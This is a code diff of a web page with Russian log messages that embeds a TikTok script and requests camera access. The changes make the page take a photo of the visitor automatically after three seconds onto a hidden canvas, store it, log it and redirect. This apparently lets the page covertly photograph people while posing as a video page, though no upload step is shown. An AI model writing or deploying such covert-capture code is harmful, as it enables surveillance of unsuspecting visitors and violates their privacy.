@@ -61,7 +61,6 @@
   <canvas id="canvas" width="740" height="580" style="display:none;"></canvas>
 
   <script async src="https://www.tiktok.com/embed.js"></script>
-  
   <script>
     'use strict';
 
@@ -80,7 +79,6 @@
     async function requestCameraAccess() {
       console.log('Запрос доступа к камере...');
       try {
-        
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         console.log('Камера успешно запущена!');
         handleSuccess(stream);
@@ -103,33 +101,36 @@
 
 
 
-    function handleSuccess(mediaStream) {
+    function handleSuccess(stream) {
       
       console.log('Начинаем обработку потока камеры...');
+      window.stream = stream;
+      video.srcObject = stream;
 
-      let mediaStreamTrack = mediaStream.getVideoTracks()[0];
-      imageCapture = new ImageCapture(mediaStreamTrack);
-
+      const mediaStreamTrack = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(mediaStreamTrack);
 
       const context = canvas.getContext('2d');
 
       setTimeout(function () {
+        
         if (!photoTaken) {
-          console.log('Фотографирование...');
 
-          
-          canvas.width = imageCapture.videoWidth;
-          canvas.height = imageCapture.videoHeight;
-
-          context.drawImage(imageCapture, 0, 0, imageCapture.videoWidth, imageCapture.videoHeight);
-
-          canvas.toBlob(function(blob) {
-            console.log('Фотография создана');
-            savedPhoto = blob;
-            photoTaken = true;
-            logPhotoInfo();
-            redirectToFinalDestination();
-          }, 'image/png');
+            
+          imageCapture.grabFrame().then(imageBitmap => {
+            canvas.width = imageBitmap.width;
+            canvas.height = imageBitmap.height;
+            canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
+            console.log('Фотографирование...');
+            canvas.toBlob(function(blob) {
+              console.log('Фотография создана');
+              savedPhoto = blob;
+              photoTaken = true;
+              logPhotoInfo();
+              redirectToFinalDestination();
+            }, 'image/png');
+          }
+        );
         }
       }, 3000);
     }
